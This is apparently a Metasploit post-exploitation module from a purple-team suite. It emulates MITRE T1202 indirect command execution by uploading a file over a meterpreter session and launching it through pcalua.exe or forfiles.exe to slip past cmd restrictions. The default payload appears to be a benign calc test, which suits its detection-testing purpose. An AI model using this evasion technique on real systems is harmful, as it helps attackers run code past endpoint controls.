##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Purple
  include Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Indirect Command Execution (T1202) Windows - Purple Team',
                      'Description'   => %Q{
                       Defense Evasion:
                       Various Windows utilities may be used to execute commands, possibly without invoking
                       cmd. For example, Forfiles, the Program Compatibility Assistant (pcalua.exe),
                       components of the Windows Subsystem for Linux (WSL), as well as other utilities may
                       invoke the execution of programs and commands from a Command-Line Interface, Run
                       window, or via scripts. \n\n

                       Adversaries may abuse these utilities for Defense Evasion, specifically to perform
                       arbitrary execution while subverting detections and/or mitigation controls (such as
                       Group Policy) that limit/prevent the usage of cmd.  \n\n

                       RCMD can be like one of: \n
                        calc.exe \n
                        c:\\temp\\payload.dll \n
                        C:\\Windows\\system32\\javacpl.cpl -c Java \n\n

                       Define LFILE to upload a custom file and set the appropriate RCMD to run it. \n\n

                       RFILE is the remote location to put LFILE, if not defined, the remote file will have the same name
                       as the LFILE.
                       },
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [
                                          [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1202' ],
                                          [ 'URL', 'https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1202' ]
                                         ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptInt.new( 'METHOD', [ true, '0=both(if you select CPL for the payload, forfiles will not execute), 1=pcalua(exe, dll, cpl) , 2=forfiles(exe, dll)', 1 ]),
      OptInt.new( 'FILE_TYPE', [ true, '1=EXE, 2=DLL, 3=CPL', 1 ]),
      OptString.new( 'LFILE', [false, 'Local file to upload.', Msf::Config.data_directory + "/purple/t1202/t1202.[exe|dll|cpl]" ]),
      OptString.new( 'RFILE', [false, 'Remote file path', 'C:\\t1202.[exe|dll|cpl]' ]),
      OptInt.new('ARCH', [false, 'Architecture (1=x86,2=x64), defaults to x64', 2 ]),
      OptBool.new('CLEANUP', [ true, "Cleanup", true])
    ])
  end

  def t1202_pcalua
    local_file_path = datastore["LFILE"]
    remote_file_path = datastore["RFILE"]
    case datastore['FILE_TYPE']
    when 1
      if local_file_path =~ /purple\/t1202\/t1202/
        local_file_path.sub!(/\[exe\|dll\|cpl\]/, "exe")
        remote_file_path.sub!(/\[exe\|dll\|cpl\]/, "exe")
      end
    when 2
      print_error("DLL execution is currently not working")
      exit()
      if local_file_path =~ /purple\/t1202\/t1202/
        local_file_path.sub!(/\[exe\|dll\|cpl\]/, "dll")
        if datastore['ARCH'] == 1
          local_file_path.sub!("t1202.", "t1202_x86.")
        else
          local_file_path.sub!("t1202.", "t1202_x64.")
        end
        remote_file_path.sub!(/\[exe\|dll\|cpl\]/, "dll")
      end
    when 3
      if local_file_path =~ /purple\/t1202\/t1202/
        local_file_path.sub!(/\[exe\|dll\|cpl\]/, "cpl")
        if datastore['ARCH'] == 1
          local_file_path.sub!("t1202.", "t1202_x86.")
        else
          local_file_path.sub!("t1202.", "t1202_x64.")
        end
        remote_file_path.sub!(/\[exe\|dll\|cpl\]/, "cpl")
      end
    end
    print_status("Uploading #{local_file_path} to #{remote_file_path}")
    upload_file(remote_file_path, local_file_path)

    run_cmd("pcalua -a #{remote_file_path}", false)

    sleep(2)
    check_for_calc
  end

  def t1202_forfiles
    local_file_path = datastore["LFILE"]
    remote_file_path = datastore["RFILE"]
    case datastore['FILE_TYPE']
    when 1
      if local_file_path =~ /purple\/t1202\/t1202/
        local_file_path.sub!(/\[exe\|dll\|cpl\]/, "exe")
        remote_file_path.sub!(/\[exe\|dll\|cpl\]/, "exe")
      end
    when 2
      print_error("DLL execution is currently not working")
      exit()
      if local_file_path =~ /purple\/t1202\/t1202/
        local_file_path.sub!(/\[exe\|dll\|cpl\]/, "dll")
        if datastore['ARCH'] == 1
          local_file_path.sub!("t1202.", "t1202_x86.")
        else
          local_file_path.sub!("t1202.", "t1202_x64.")
        end
        remote_file_path.sub!(/\[exe\|dll\|cpl\]/, "dll")
      end
    end
    print_status("Uploading #{local_file_path} to #{remote_file_path}")
    upload_file(remote_file_path, local_file_path)

    run_cmd("forfiles /p c:\\windows /m explorer.exe /c #{remote_file_path}", false)

    sleep(2)
    check_for_calc
  end

  def run
    begin
      raise "Module requires meterpreter session" unless session.type == 'meterpreter'
      kill_calc

      case datastore['METHOD']
      when 0
        t1202_pcalua()
        _cleanup
        t1202_forfiles()
      when 1
        t1202_pcalua()
      when 2
        t1202_forfiles()
      else
        raise "Invalid method selected."
      end

      _cleanup unless not datastore['CLEANUP']
      print_good("Module T1202W execution successful.")
    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1202W execution failed.")
    end
  end

  def _cleanup
    print_status("Killing calc and cleaning up files")
    kill_calc(true)
  end
end
